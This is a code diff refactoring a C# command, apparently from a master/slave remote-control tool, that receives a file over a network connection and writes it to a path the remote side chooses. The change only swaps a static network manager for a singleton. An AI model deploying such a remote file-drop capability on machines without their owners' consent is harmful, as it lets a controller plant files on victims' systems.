@@ -1,8 +1,8 @@
 ﻿using Shared;
-using Slave.Commands.Core;
 using System;
 using System.Collections.Generic;
 using System.IO;
+using Slave.Core;
 
 namespace Slave.Commands
 {
@@ -16,16 +16,16 @@ namespace Slave.Commands
             {
                 using (var fs = new FileStream(args[1], FileMode.Create))
                 {
-                    SlaveCommandsManager.networkManager.NetworkStreamToStream(fs);
+                    SlaveNetworkManager.GetInstance().NetworkStreamToStream(fs);
                 }
 
-                SlaveCommandsManager.networkManager.WriteLine("Success");
+                SlaveNetworkManager.GetInstance().WriteLine("Success");
             }
             catch (Exception)
             {
                 // Delete the partially created file
                 File.Delete(args[1]);
-                SlaveCommandsManager.networkManager.WriteLine("Error");
+                SlaveNetworkManager.GetInstance().WriteLine("Error");
             }
         }
     }
